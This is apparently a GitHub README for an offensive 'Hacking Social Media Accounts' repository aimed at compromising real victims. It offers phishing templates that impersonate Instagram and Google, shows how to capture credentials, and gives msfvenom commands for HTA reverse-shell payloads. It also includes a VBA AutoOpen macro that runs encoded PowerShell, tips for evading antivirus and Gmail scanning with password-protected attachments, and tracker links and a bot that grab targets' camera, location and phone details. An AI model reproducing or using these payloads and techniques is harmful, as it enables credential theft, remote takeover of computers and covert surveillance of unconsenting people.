# Hacking-Social_Media-Accounts
Hacking Social Media Accounts with Phishing Tool (GoPhish) 🐟

![Screenshot_2024-03-02-23-51-55-769_com google android youtube](https://github.com/DevVj-1/Hacking-Social_Media-Accounts/assets/106962581/476a2b94-e124-4840-bef6-0dc723f24d2c)

<p align="left"> <img src="https://komarev.com/ghpvc/?username=DevVj-1&label=👁%20views%20%20&color=0e75b6&style=flat" alt="DevVj-1" /> </p>

### ⚠️ NOTICE: 
**🫵🏼 First time here? huh ( ≖‿  ≖ )🔪**

**Don't forget to hit the star button ⭐️ up there! I keep updating this repo with more phishing-related stuff over time**

***so be sure to show some love!🩸🫶🏽***

⚠️ Like my content ?, then lets connect on Linkedin 

Linkedin: [linkedin.com/in/dev-vj1/](https://www.linkedin.com/in/dev-vj1/)

* ※ If this tricks helps you, then don’t forget to share this repo with other! Hackers :)


<div align="center">

![1](https://media.giphy.com/media/8eteLyVqRlL1AOz7Uz/giphy.gif)
</div>


# gophish-templates
Templates for an open-source Phishing Toolkit
Some very basic configurations and templates to provide clean layouts usable in [GoPhish](https://github.com/gophish/gophish), an open-source phishing toolkit. These layouts provided will also work with any other phising service as well, though they have only been tested in GoPhish.

![GoPhish](https://i.imgur.com/7Jklgjv.png)

## Installation ⚓
Installing the files is easy. Download the GoPhish client and log in at `https://127.0.0.1:3333/` with the standard credentials visible in the command line. There, the various templates and landing pages can be configured with my html configurations. 

![12 04 2025_10 08 00_REC](https://github.com/user-attachments/assets/2cf1edf5-96e0-4489-aa33-ab421b2c7551)

 
## Features 🎣
* Instagram Landing Page
* Instagram Mail Template


#### Instagram Landing Page 💈

A very basic Instagram landing page which attempts to have people enter user details.

Link: `https://www.instagram.com/accounts/login/`  
Title: `Login • Instagram`

![instagrampage](https://i.imgur.com/eR5GJoo.png)


#### Instagram Mail Template 💈

A very basic Instagram mail which attempts to have people click on a link to secure their account.

Subject: `New Instagram Login`  
Sender: `security@mail.instagram.com`

![instagrammail](https://i.imgur.com/ILUT94f.png)

#### Google Chrome OS Mail Template 💈  

<div align="center">

![1](
https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNXZmbmE5bmdhdnE2aGlrd3M1eWRzMDA1Nmp3OGQxM210MGFnZjZqYyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/39iwo4k4Utd6pRryL8/giphy.gif)
</div>

**A very basic Google mail, which notifies the user about a login.** 

Subject: `New Sign In`  
Sender: `no-reply@accounts.google.com`  

![chromemail](https://i.imgur.com/wx0g4ZC.png)

## Free web port Forwarding...
![port-Forwarding](https://github.com/DevVj-1/Hacking-Social_Media-Accounts/assets/106962581/dd71a684-9b92-4f30-a3db-ee568b7067f8)

# 💻 Playit.gg TCP Reverse Shell Port Forwarding 

🛑 YOUTUBE Video: https://youtu.be/uoOuLqkmidU?si=Lv2b5K2UmRBsGnLi

⚓ https://github.com/DevVj-1/Hacking-Social_Media-Accounts/blob/main/Shell_Port-Forwarding.md



### Just 👇 run this command ₊˚🎐
```
ssh -R 80:localhost:8080 nokey@localhost.run
```
```
http://localhost.run/
```
![green](https://github.com/DevVj-1/Hacking-Social_Media-Accounts/assets/106962581/c0a32b9e-18ee-4025-acb1-e74711819845)


## Q/A ❓
### Q1 Submitted Form Data Isn't Being Captured (o_O)? 
To capture data submitted through a landing page, you need to create an HTML <form> element on your landing page that has a few specific properties:
Here is a minimal example <form> element which captures data: 

```
<form action="" method="POST">
    <input name="username" type="text" placeholder="username" />
    <input name="password" type="password" placeholder="password" />
    <input type="submit" value="Submit" />
</form>

```
#### There are a few things to note about this form:

* The action is "" so that form submissions are directed to your phishing page and, therefore, to your Gophish server
* The form submission method is POST 
* Each input which you expect to see in Gophish has a name attribute

Each of these should be checked when troubleshooting HTML forms that don't appear to be sending data correctly.
If you still aren't seeing your form submitted correctly, you may need to review and remove any Javascript on the page interfering with the form submission.
Finally, ensure that when saving the landing page that you have both the "Capture Submitted Data" and "Capture Passwords" (if appropriate) options checked. Otherwise, Gophish will remove the name attributes from your inputs so they aren't submitted with the form. 

### Q2  How i setup Phishing Campaing ? ¯\_(ツ)_/¯ 

You can read this article to get more information about how to set up a phishing campaign!
```
https://www.hackercoolmagazine.com/gophish-setup-a-phishing-campaign/
```
# 
#

# 🚀 How To HOst a Deface WebPage by Exploiting XSS Vulnerability



preview 👉: https://prdb.pk/front/search/ICA8aWZyYW1lIHNyYz0iaHR0cHM6Ly9yYW1lZDgwMDQ4LnB5dGhvbmFueXdoZXJlLmNvbS8iICBzdHlsZT0iYm9yZGVyOiAwOyBwb3NpdGlvbjpmaXhlZDsgdG9wOjA7IGxlZnQ6MDsgcmlnaHQ6MDsgYm90dG9tOjA7IHdpZHRoOiAxMDAlOyBoZWlnaHQ6MTAwJSI+

![Team_Valhalla](https://github.com/user-attachments/assets/e56cb946-30bd-4ecc-9a7e-5cb0b952e70c)

🛑 Youtube Video Tutorial:  https://youtu.be/znlRD3A-1hY?si=lYkZUJLU9DqOQTej

✍️ Writeup: https://github.com/DevVj-1/Hacking-Social_Media-Accounts/blob/main/Deface-Web-by-exploiting-xss.md



# OSINT (Open-source Intelligence) 🔍



### MOBILE TRACKER 🖁
A service specifically designed to Track Mobile Number, Location on Google Map including information such as the owner's Name,Location,Country,Telecom provider.
  
EMOBILETRACKER : https://www.emobiletracker.com/

※ https://inteltechniques.com/tools/Username.html
🔎 Freely available online open source investigation toolkit.🕵️‍♂️

![OSINT](https://github.com/user-attachments/assets/064b8201-e4fc-421b-9d37-e725bb9532e8)


```
https://docs.google.com/spreadsheets/d/18rtqh8EG2q1xBo2cLNyhIDuK9jrPGwYr9DI2UncoqJQ/edit?pli=1#gid=1700243466
```
```
https://map.malfrats.industries/
```
![ojeon6pzrkqivmrydatu](https://github.com/user-attachments/assets/a8c3ac4c-b0ac-497e-a7a3-6a538cda906f) 

**Ultimate-osint-collection :** https://start.me/p/DPYPMz/the-ultimate-osint-collection
**https://start.me/p/L1rEYQ/osint4all

## GeoOSINT 🔎

### Realtime Movement (MISC) 

![Screenshot 2025-05-16 223734](https://github.com/user-attachments/assets/cefa0b19-8e9f-4d5c-8f7c-b096c2865530)

 Mappillary is also a great service providing tons of images from transports
 (Cars, Train, etc)
 Can be usefull to identify locations where there is no roads (ex : trains)
 
※ https://www.mapillary.com

### Tools for viewing past aerial imagery

![Screenshot 2025-05-16 225848](https://github.com/user-attachments/assets/7f8fa2c6-c461-46bb-a27c-aabdad1b9d53)

※ https://livingatlas.arcgis.com/wayback/

###  Views realtime map (streetview, satellite, maps)

![Screenshot 2025-05-16 230753](https://github.com/user-attachments/assets/48f0c80d-fec7-4d7e-b811-55a2c65d7dd6)


※ http://data.mashedworld.com/dualmaps/map.htm

# Social Media Verification

🌐 A Beginner's Guide to Social Media Verification 📌
```
https://www.bellingcat.com/resources/2021/11/01/a-beginners-guide-to-social-media-verification/
```
※ Username searching...🔍 
```
https://whatsmyname.app/
```
## Tracking via phishing links...

![find](https://github.com/DevVj-1/Hacking-Social_Media-Accounts/assets/106962581/06ffa2d8-ba1a-4965-a154-5e04a797b26e)

```
https://github.com/thewhiteh4t/seeker
```

※ Online Alternative ※

**Popular online Tracker tools**

1) Create a Tracker Link :
https://grabify.link/

2) Create a Tracker Link :
https://tracker.iplocation.net/

3) Telegram BOT 🎯💯:- @Camera_location_sf1_bot

![Screenshot 2024-12-29 225659](https://github.com/user-attachments/assets/3eefb243-3275-4b45-b8a9-4c829a706777)

You can Hack:

🎯 Front Camera 📷

🎯 exact Location with map 📍

🎯 Phone number

🎯 Sim Type

🎯 IP, Battery, and many more...

![Screenshot 2025-01-12 154944](https://github.com/user-attachments/assets/26b521c9-2969-4dfd-88af-9092ac1460b1)

Q) What is baiting technique?
Baiting is a variant of social engineering where the perpetrator lures the victim with attractive offers or rewards. This tactic tricks the victim into unintentionally downloading malware into their system or revealing confidential personal or organizational information

![Screenshot 2024-12-29 225751](https://github.com/user-attachments/assets/532ee92f-eb23-44da-acb6-aaaf70d989f2)



## How do you Track an Email Address?

I assume that many of you are wondering how is it possible to trace an email address and find the location of an email?
a email header contains a lot of information about the email itself as well as the sender!📌

**How To Copy Email Header ❓**
```
https://it.umn.edu/services-technologies/how-tos/gmail-view-email-headers
```

( Copy full email header from any email that you would like to trace back and find email sender location)
```
https://www.ip-tracker.org/email/finder.php
```
## How do you Track an Suspicious IP address

You can easily lookup, track and find IP location. Simple enter the IP address or domain into input box to start finding its location, as well as additional relevant IP or DNS information.

```
https://www.ip-tracker.org/
```
## Geolocation Investigation maps (OSINT)

Allows you to search for mapped information in the Open Street Map database using command-line queries, making it an unrivalled geolocation tool.

* Map: https://overpass-turbo.eu/
* Guide: https://publication.osintambition.org/3-ways-to-use-overpass-turbo-if-you-dont-know-overpass-query-language-2f748b0fb66b

## Image geolocation Investigation with AI tool
This tool looks at things like plants, building styles, and weather in the picture and compares them to a large collection of photos that have known locations.

* Geospy: https://geospy.ai/

<div align="center">

![1](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExYnA4MWxmZHVjdGV6Mmw5ZGc5M3FyYXBsbXhzYW5mdTV3Z2tnNWxvNiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Jth6eoS4noFUDH7IcM/giphy.gif)
</div>

# Meterpreter as Persistence Backdoor 💀⃤
<div align="center">

![3](https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNXoyYTFucjYyaWtzMHhtdHgzbGYyOTRpMmozNDZnb3hsdjk1anZtbCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/UqxVRm1IaaIGk/giphy.gif)
</div>

- **[MSF-Persistence-Backdoor](https://github.com/DevVj-1/Hacking-Social_Media-Accounts/blob/main/MSF-Persistence-Backdoor.md)**:
- **[Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)**: More Hacking Tricks and commands 👁️⃤


  # How to Compromise Windows 🦋 system

***You can add this payload to your phishing email. When the victim installs & open this malicious file, you'll get your shell 🐚***

## HTA Attack in Action

We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. 
In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.

```
msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
```
## Exploiting Microsoft Windows using MS Word Macro [ Manually ] 🐓
The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.

Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
```
Create the .doc file
Use the base64 powershell code from revshells.com
```
Used this code to inline macro(Paste the code from revshells in str variable) :
```
str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

n = 50

for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
```
```
Sub AutoOpen()

  MyMacro

End Sub

Sub Document_Open()

  MyMacro

End Sub

Sub MyMacro()

    Dim Str As String

   <b>Paste the script output here!<b>

    CreateObject("Wscript.Shell").Run Str

End Sub
```
## Exploiting Microsoft Windows using MS Word Macro [Automation Script] 🪿
If the thought of manually crafting a macro exploit seems feels like a headache then This tool simplifies the process, which automatically generate MW word macros which contain's your RCE payload code.

***Minitrue***
```
git clone https://github.com/X0RW3LL/Minitrue.git
```
```
cd /opt/WindowsMacros/Minitrue
./minitrue
select a payload: windows/x64/shell_reverse_tcp
select the payload type: VBA Macro
LHOST=$yourIP
LPORT=$yourPort
Payload encoder: None
Select or enter file name (without extensions): hacker
```
# Malicious Macros Generators

1) https://github.com/cldrn/macphish
2) https://github.com/cedowens/Mythic-Macro-Generator
   
## Pro tip ♦️: 
**You can put a password on your payload file to bypass Windows antivirus. 🔍**

**When the victim receives your email containing an attachment, the attachment is a password-protected spreadsheet or MS Word file. Make sure you provide a password in your phishing email. When Your target downloads 📩 the file and then enters the password to open it . your malicious payload is executed on their computer!** 

**because antivirus software is not able to scan your malicious file, as it is encrypted and password-protected.🔐** 
Antiviruses are designed to scan for malicious behavior. Not to crack the password protected file, LoL.
<div align="center">

![1](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNTh2cWNwY2toOWg5cjBxbjFrM2RsNmtlcjZxdnhwY3B3bG52aW50dCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VLWIuR02bq33gp48aQ/giphy.gif)
</div>

## Disclaimer
The files in this repository were created and modified by me,  for my own personal use and come with no guarantee to work for you. I provide these files "as-is" and offer no support whatsoever to get them working. A lot of these files use terrible formatted and layered tables, anyone working with email and newsletter designs knows how painful they can be, and how worse it is to reverse-engineer those.🦆 

## How you Bypass Gmail macro restrictions
You can bypass gmail scanning for potentially malicious macros by converting Microsoft Word (.docx) or Excel (.xlsx) files into PDF format before sending them via email. Then, you suggest informing the recipient (Target) to convert the file back to its original format in order to use it. 

![IMG_20240217_110508](https://github.com/DevVj-1/Hacking-Social_Media-Accounts/assets/106962581/fa1a6ba9-63e2-4e7b-afe5-397e71985875)

While PDF files are generally considered safer than Word or Excel files in terms of macro-based attacks, they are not immune to security risks. PDF files can contain other types of malicious content, such as embedded links or JavaScript-based attacks.


<img width="1903" height="669" alt="image" src="https://github.com/user-attachments/assets/d2f4cbbe-7fd9-4dbb-bb90-def28a658959" />

## Best OSINT Search Engine: https://www.etools.ch/

# Face Search Engine Reverse Image Search 🩻:

![download](https://github.com/user-attachments/assets/1b0b7e39-c84d-408a-86a3-d88338df18e5)


PimEyes: https://pimeyes.com/en


![somthing](https://github.com/DevVj-1/Hacking-Social_Media-Accounts/assets/106962581/38160faf-3a18-48de-8f24-e0270ba70fa1)

# ⚜ Proactive Cyber Security Roadmap in just 4 steps📌🌎
Link: https://medium.com/@devvijay7113/proactive-cyber-security-roadmap-in-just-4-steps-1d8e60ade989


